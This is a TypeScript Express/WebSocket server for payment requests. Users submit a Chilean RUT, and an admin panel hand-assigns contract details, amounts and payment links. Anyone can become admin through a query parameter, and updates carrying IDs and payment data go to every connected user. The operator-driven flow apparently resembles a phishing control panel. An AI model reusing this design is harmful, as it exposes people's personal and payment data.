import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { WebSocketServer, WebSocket } from "ws";
import type { WebSocket as WebSocketType } from "ws";
import { storage } from "./storage";

// Store active clients and payment requests
interface PaymentRequest {
  rut: string;
  id: string;
  status: 'pending' | 'processing' | 'completed' | 'rejected';
  timestamp: number;
  response?: string;
  // Nuevos campos para el panel de control
  contractNumber?: string;
  vehicleType?: string;
  amount?: string;
  paymentLink?: string;
}

interface AdminClient {
  ws: WebSocket;
  isAdmin: boolean;
}

interface UserClient {
  ws: WebSocket;
  requestId?: string;
}

const paymentRequests: Map<string, PaymentRequest> = new Map();
const adminClients: Set<AdminClient> = new Set();
const userClients: Map<string, UserClient> = new Map();

// Generate unique ID
function generateId(): string {
  return Math.random().toString(36).substring(2, 15) + 
         Math.random().toString(36).substring(2, 15);
}

export async function registerRoutes(app: Express): Promise<Server> {
  // API routes
  app.get("/api/health", (_req, res) => {
    res.json({ status: "healthy" });
  });

  // API to create a payment request
  app.post("/api/payment-request", (req: Request, res: Response) => {
    const { rut } = req.body;
    
    if (!rut) {
      return res.status(400).json({ error: "RUT is required" });
    }
    
    const requestId = generateId();
    const paymentRequest: PaymentRequest = {
      rut,
      id: requestId,
      status: 'pending',
      timestamp: Date.now()
    };
    
    paymentRequests.set(requestId, paymentRequest);
    
    // Notify all admin clients about the new payment request
    adminClients.forEach(client => {
      if (client.ws.readyState === WebSocket.OPEN) {
        client.ws.send(JSON.stringify({ 
          type: 'new_request', 
          request: paymentRequest 
        }));
      }
    });
    
    return res.status(201).json({ requestId });
  });
  
  // API to check payment request status
  app.get("/api/payment-request/:id", (req: Request, res: Response) => {
    const { id } = req.params;
    const request = paymentRequests.get(id);
    
    if (!request) {
      return res.status(404).json({ error: "Payment request not found" });
    }
    
    return res.json(request);
  });

  // Create HTTP server
  const httpServer = createServer(app);
  
  // Setup WebSocket server with a specific path
  const wss = new WebSocketServer({ 
    server: httpServer,
    path: '/ws'
  });
  
  wss.on('connection', (ws: WebSocket, req) => {
    const url = new URL(req.url || '', `http://${req.headers.host}`);
    const clientType = url.searchParams.get('type') || 'user';
    const requestId = url.searchParams.get('requestId');
    
    console.log(`New WebSocket connection: ${clientType}`);
    
    if (clientType === 'admin') {
      // Admin client
      const admin: AdminClient = { ws, isAdmin: true };
      adminClients.add(admin);
      
      // Send list of active payment requests to new admin
      const requestsList = Array.from(paymentRequests.values())
        .filter(req => req.status === 'pending' || req.status === 'processing');
      
      ws.send(JSON.stringify({ 
        type: 'requests_list', 
        requests: requestsList 
      }));
      
      ws.on('message', (message) => {
        try {
          const data = JSON.parse(message.toString());
          
          if (data.type === 'update_request') {
            console.log('Admin update request received:', data);
            const { requestId, status, response, contractNumber, vehicleType, amount, paymentLink } = data;
            console.log('Admin update data extracted:', { 
              requestId, 
              status, 
              response, 
              contractNumber, 
              vehicleType, 
              amount, 
              paymentLink 
            });
            
            const request = paymentRequests.get(requestId);
            
            if (request) {
              console.log('Updating request with ID:', requestId);
              console.log('Original request:', JSON.stringify(request));
              
              // Actualizar el estado y respuesta
              request.status = status;
              if (response !== undefined) {
                console.log('Setting response to:', response);
                request.response = response;
              }
              
              // Actualizar nuevos campos si están presentes
              if (contractNumber !== undefined) {
                console.log('Setting contractNumber to:', contractNumber);
                request.contractNumber = contractNumber;
              }
              
              if (vehicleType !== undefined) {
                console.log('Setting vehicleType to:', vehicleType);
                request.vehicleType = vehicleType;
              }
              
              if (amount !== undefined) {
                console.log('Setting amount to:', amount);
                request.amount = amount;
              }
              
              if (paymentLink !== undefined) {
                console.log('Setting paymentLink to:', paymentLink);
                request.paymentLink = paymentLink;
              }
              
              console.log('Updated request:', JSON.stringify(request));
              
              // Find user client with this requestId and notify them
              console.log('Looking for user clients with requestId:', requestId);
              console.log('Active user clients:', Array.from(userClients.entries()).map(([id, c]) => ({ id, requestId: c.requestId })));
              
              // DIRECTLY BROADCAST THIS REQUEST UPDATE TO ALL USER CLIENTS
              // This ensures any client viewing this request will get updated
              let userNotified = false;
              Array.from(userClients.values()).forEach(client => {
                if (client.ws.readyState === WebSocket.OPEN) {
                  console.log(`Broadcasting update to all user clients`);
                  const updateMessage = JSON.stringify({ 
                    type: 'request_update',
                    request
                  });
                  console.log('User update message:', updateMessage);
                  client.ws.send(updateMessage);
                  userNotified = true;
                }
              });
              
              if (!userNotified) {
                console.log('No matching user client found to notify for requestId:', requestId);
              }
              
              // Notify all admins about the update
              console.log('Notifying other admin clients about update');
              let adminNotifyCount = 0;
              adminClients.forEach(adminClient => {
                if (adminClient.ws.readyState === WebSocket.OPEN && adminClient !== admin) {
                  adminClient.ws.send(JSON.stringify({ 
                    type: 'request_updated', 
                    request 
                  }));
                  adminNotifyCount++;
                }
              });
              console.log(`Notified ${adminNotifyCount} other admin clients`);
            }
          }
        } catch (err) {
          console.error('Error parsing admin message:', err);
        }
      });
      
      ws.on('close', () => {
        adminClients.delete(admin);
        console.log('Admin client disconnected');
      });
    } else {
      // User client
      const clientId = generateId();
      const userClient: UserClient = { ws };
      
      console.log(`New user client connected with ID: ${clientId}`);
      
      if (requestId) {
        console.log(`User client has requestId: ${requestId}`);
        userClient.requestId = requestId;
        const request = paymentRequests.get(requestId);
        
        if (request) {
          console.log(`Found request for ID ${requestId}:`, JSON.stringify(request));
          // Send initial state to user
          const statusMessage = JSON.stringify({ 
            type: 'request_status',
            request
          });
          console.log(`Sending initial status to user:`, statusMessage);
          ws.send(statusMessage);
        } else {
          console.log(`No request found for ID: ${requestId}`);
        }
      } else {
        console.log(`User client connected without a requestId`);
      }
      
      // Add client to the map
      userClients.set(clientId, userClient);
      console.log(`Active user clients after adding new one: ${userClients.size}`);
      console.log(`User clients with requestIds:`, Array.from(userClients.entries())
        .filter(([_, c]) => c.requestId)
        .map(([id, c]) => ({ clientId: id, requestId: c.requestId })));
      
      ws.on('message', (message) => {
        try {
          const data = JSON.parse(message.toString());
          console.log('User message:', data);
          
          if (data.type === 'register_request' && data.requestId) {
            userClient.requestId = data.requestId;
            const request = paymentRequests.get(data.requestId);
            
            if (request) {
              ws.send(JSON.stringify({ 
                type: 'request_status',
                request
              }));
            }
          }
        } catch (err) {
          console.error('Error parsing user message:', err);
        }
      });
      
      ws.on('close', () => {
        userClients.delete(clientId);
        console.log('User client disconnected');
      });
    }
  });

  return httpServer;
}
